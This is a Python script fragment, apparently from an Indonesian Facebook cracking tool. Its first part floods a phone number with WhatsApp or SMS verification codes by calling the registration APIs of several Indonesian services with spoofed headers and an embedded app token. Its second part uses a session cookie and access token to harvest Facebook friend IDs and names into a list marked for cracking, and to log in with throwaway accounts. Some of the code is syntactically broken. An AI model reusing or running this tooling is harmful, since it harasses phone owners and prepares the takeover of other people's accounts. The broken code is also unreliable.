		head8 = {"host": "api.bibit.id","content-length": "90","origin": "https://app.bibit.id","x-app-check":"eyJraWQiOiJsWUJXVmciLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjE4ODMwMjcxNDM5Mzp3ZWI6ODVjZmMxY2M2YWI1OTlkMTExNmM4OCIsImF1ZCI6WyJwcm9qZWN0c1wvMTg4MzAyNzE0MzkzIiwicHJvamVjdHNcL2JpYml0LTRjMThiIl0sImlzcyI6Imh0dHBzOlwvXC9maXJlYmFzZWFwcGNoZWNrLmdvb2dsZWFwaXMuY29tXC8xODgzMDI3MTQzOTMiLCJleHAiOjE2Nzk3MTQxMTAsImlhdCI6MTY3OTYyNzcxMCwianRpIjoiZktKeUdKbG40cWowcDJJczJvd0duUTI4QlFtYjFPeXRBcXhFM3hLLVlXZyJ9.OewMoF4ShtR46xUu2yaJQcSdhvgQS2gPwCCqghwcP7878hSJTMHTRpiy-fJZ3iLugqXmIC3XDjUG_OjKb4pn8dpCUL1PokLIDr_eFh7R0QJnZ-nN3TRLXwd9EbaAHcsSUN7kEbJA8iLOUEbtpRI2b9xIVuydYCpSD4oz_5SYTm9DneKCVQ8xNy6ELxc8bzmE-6QgsY8fJDfHOpD205O1Z0ec0Csi69qD-Md7E-FdmXxkU8uZXeg2mz86l_5fwJPqeNkzdQdfyr-xfzMYnUnO1iarXezEVuG89TpoJc2jZ5n3hZUoDgkJQZ_lWQYaB4T0vhAbeLdAAU_dRkBXRdNWXGFWPx8WcKyun5cdK8ULXShcK3HfvQMWRzEWdhTRIidUdpERDFxuo-BkSaARsIP-b1SpDBB7DEghvFD-AQt2xUVbGdU_rB7pRg9091fDfyfEz7IvpGpFqIZ9jMVmxieoLHOwZ1Mo5HlY2w5O-ZL5hf_FmrATe-WnGdfy4UXCy1JK","user-agent":"Mozilla/5.0 (Linux; Android 9; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36","content-type":"application/json","accept":"application/json, text/plain, */*","x-platform":"web","save-data":"on","referer":"https://app.bibit.id/register","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		data8 = json.dumps({"code":"62","phone":"8"+nomer,"via":"whatsapp","recaptcha_token":"","recaptcha_type":"v3"})
		pos_bibit = requests.post("https://api.bibit.id/auth/register/phone",headers=head8,data=data8).text
		nomer = open('nomer.txt','r').read()
		head9 = {"Host": "auth.dekoruma.com","content-length": "67","origin": "https://m.dekoruma.com","save-data": "on","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36","content-type": "application/json","accept": "*/*","referer": "https://m.dekoruma.com/signup","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		data9 = json.dumps({"phoneNumber":"+628"+nomer,"platform":"wa","captchaInput":""})
		pos9 = requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers=head9,data=data9).text
		pintar_head = {"Host": "pasarkuota.com","content-type": "application/x-www-form-urlencoded","content-length": "165","accept-encoding": "gzip","user-agent": "okhttp/5.0.0-alpha.5"}
		pintar_req = requests.post("https://pasarkuota.com/api/v2/pre-register",headers=pintar_head,data="c_rc=0&app_reg_id=&latitude=&c_rswa=1&c_h2w=0&token=&c_gg=1&c_pn=0&app_version_code=220924&phone=08"+nomer+"&vss=1&app_version_name=22.09.24&ui_mode=dark&longitude=")
		h=10
		for i in range(11):
			print(f'\rCD {h} detik',end='')
			if h ==0:
				print('\r===========================================')
		sys.stdout.flush()
		bobo(1)
		h-=1
###############################################Dump Id to crack ###################################Tamsis
def dump(opsi):
	if '1' in opsi:
		global limitd
		u = input('ID Publik : ')
		cetak(pnl('[white]Di Sarankan Jangan Lebih Dari 30000',width=95,padding=(0,1),style=f"blue"))
		limit = input('Limit : ')
		mek = 0+ int(limit)
		limitd+=mek
		p = Tamsis(f'https://graph.facebook.com/v1.0/{u}?fields=friends.limit(5000)&access_token='+token[0],cookies={'cookie': cok[0]}).json()
		try:
			print(p['error']['message']);pass   
		except KeyError:
			try:
				for i in p['friends']['data']:
					p = (i['id'])
					if len(p)<14:pass
					else:udi.append(p)
			except KeyError:print('\nGagal Dump ID\n[ ! ]ID Harus Public')
		dump_id('mas')
	elif '2' in opsi:
		p = input('ID Publik : ')
		udi.append(p)
		dump_id('pub')
def dump_id(pel):
	h=0
	for u in udi:
		p = Tamsis(f'https://graph.facebook.com/v1.0/{u}?fields=friends.limit(5000)&access_token='+token[0],cookies={'cookie': cok[0]}).json()
		try:
			j = (p['error']['message'])
			if 'pub' in pel:print(j);exit()
			else:print(j);continue
		except KeyError:
			try:
				if pel in ['pub']:
					if 'tua' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							if '100001' in c:
								if c in id:pass
								else:id.append(c)
							elif '100002' in c:
								if c in id:pass
								else:id.append(c)
							elif '100003' in c:
								if c in id:pass
								else:id.append(c)
							elif '100004' in c:
								if c in id:pass
								else:id.append(c)
							elif '100005' in c:
								if c in id:pass
								else:id.append(c)
							elif '100006' in c:
								if c in id:pass
								else:id.append(c)
							elif '100007' in c:
								if c in id:pass
								else:id.append(c)
							elif '100008' in c:
								if c in id:pass
								else:id.append(c)
							elif '100009' in c:
								if c in id:pass
								else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
					elif 'sepuh' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							if '1000001' in c:
								if c in id:pass
								else:id.append(c)
							elif '1000002' in c:
								if c in id:pass
								else:id.append(c)
							elif '1000003' in c:
								if c in id:pass
								else:id.append(c)
							elif '1000004' in c:
								if c in id:pass
								else:id.append(c)
							elif '1000005' in c:
								if c in id:pass
								else:id.append(c)
							elif '1000006' in c:
								if c in id:pass
								else:id.append(c)
							elif '1000007' in c:
								if c in id:pass
								else:id.append(c)
							elif '1000008' in c:
								if c in id:pass
								else:id.append(c)
							elif '1000009' in c:
								if c in id:pass
								else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
					elif 'modar' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							if '1000000' in c:
								if c in id:pass
								else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
					elif 'muda' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							if '10001' in c:
								if c in id:pass
								else:id.append(c)
							elif '10002' in c:
								if c in id:pass
								else:id.append(c)
							elif '10003' in c:
								if c in id:pass
								else:id.append(c)
							elif '10004' in c:
								if c in id:pass
								else:id.append(c)
							elif '10005' in c:
								if c in id:pass
								else:id.append(c)
							elif '10006' in c:
								if c in id:pass
								else:id.append(c)
							elif '10007' in c:
								if c in id:pass
								else:id.append(c)
							elif '10008' in c:
								if c in id:pass
								else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
					else:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							if c in id:pass
							else:id.append(c)
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
						ngatur()
				else:
					if 'tua' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							if '100001' in c:
								if c in id:pass
								else:id.append(c)
							elif '100002' in c:
								if c in id:pass
								else:id.append(c)
							elif '100003' in c:
								if c in id:pass
								else:id.append(c)
							elif '100004' in c:
								if c in id:pass
								else:id.append(c)
							elif '100005' in c:
								if c in id:pass
								else:id.append(c)
							elif '100006' in c:
								if c in id:pass
								else:id.append(c)
							elif '100007' in c:
								if c in id:pass
								else:id.append(c)
							elif '100008' in c:
								if c in id:pass
								else:id.append(c)
							elif '100009' in c:
								if c in id:pass
								else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
					elif 'sepuh' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							if '1000001' in c:
								if c in id:pass
								else:id.append(c)
							elif '1000002' in c:
								if c in id:pass
								else:id.append(c)
							elif '1000003' in c:
								if c in id:pass
								else:id.append(c)
							elif '1000004' in c:
								if c in id:pass
								else:id.append(c)
							elif '1000005' in c:
								if c in id:pass
								else:id.append(c)
							elif '1000006' in c:
								if c in id:pass
								else:id.append(c)
							elif '1000007' in c:
								if c in id:pass
								else:id.append(c)
							elif '1000008' in c:
								if c in id:pass
								else:id.append(c)
							elif '1000009' in c:
								if c in id:pass
								else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
					elif 'modar' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							if '1000000' in c:
								if c in id:pass
								else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
					elif 'muda' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							if '10001' in c:
								if c in id:pass
								else:id.append(c)
							elif '10002' in c:
								if c in id:pass
								else:id.append(c)
							elif '10003' in c:
								if c in id:pass
								else:id.append(c)
							elif '10004' in c:
								if c in id:pass
								else:id.append(c)
							elif '10005' in c:
								if c in id:pass
								else:id.append(c)
							elif '10006' in c:
								if c in id:pass
								else:id.append(c)
							elif '10007' in c:
								if c in id:pass
								else:id.append(c)
							elif '10008' in c:
								if c in id:pass
								else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
					else:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							if c in id:pass
							else:id.append(c)
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
							if len(id) == limitd:ngatur()
							else:pass
			except KeyError:
				if 'pub' in pel:
					print('\nGagal Dump ID\n[ ! ]ID Harus Public')
				else:pass
#################################Login############################Tamsis
def login():
	try:
		cookie = open('cok.txt','r').read()
		p = Tamsis(https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok}).json()
		try :
			for i in p['error']['message']:
				termux('rm -rf cok.txt')
				cetak(pnl(f"""Akun Tersebut Tidak Bisa Di Gunakan Untuk Tumbal\nGunakan Akun Fress"""))
				exit()
		except KeyError:
			cok.append(cookie)
			notic()
	except FileNotFoundError:
		cetak(pnl('Kamu Belum Login'))
		a = input('Masukan Cookie : ')
		p = Tamsis(https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok}).json()
		try :
			for i in p['error']['message']:
				cetak(pnl(f"""Akun Tersebut Tidak Bisa Di Gunakan Untuk Tumbal\nGunakan Akun Fress"""))
				
				exit()
		except:
			open('cok.txt','w').write(a)
			cok.append(a)
			token.append(b)

login()